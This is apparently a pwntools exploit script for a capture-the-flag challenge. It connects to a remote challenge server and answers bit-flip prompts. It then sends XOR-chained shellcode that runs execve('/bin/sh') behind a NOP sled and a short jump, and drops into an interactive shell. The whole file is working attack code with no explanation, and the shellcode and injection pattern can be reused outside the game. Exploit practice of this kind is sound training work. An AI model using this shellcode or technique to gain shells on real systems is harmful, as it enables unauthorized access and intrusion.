from pwn import *

#r = process('./babyexploit.py')
r = remote('arcade.fluxfingers.net', 1807)

def encrypt_payload(payload):
	payload = payload[::-1]
	encrypted_payload = payload[:1]

	for i in range(len(payload) - 1):
		encrypted_payload += chr(ord(encrypted_payload[i]) ^ ord(payload[i+1]))

	encrypted_payload = encrypted_payload[::-1]

	return encrypted_payload

payload = ''
payload += '/bin/sh\x00'
payload += '\x48\x8D\x7E\xFF\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05'
payload += '\x90'*(0x27-len(payload))
payload += '\x75\xdf'
payload += '\x90'*(0x2e-len(payload))

r.sendafter('Please enter the byte-offset you want to flip (0x80-0x139): ', '0xbc\n')
r.sendafter('Please enter the bitposition you want to flip at byte-offset(7-0): ', '3\n')

pause()
r.sendafter('Enter the Key to win: ', encrypt_payload(payload))

r.interactive()
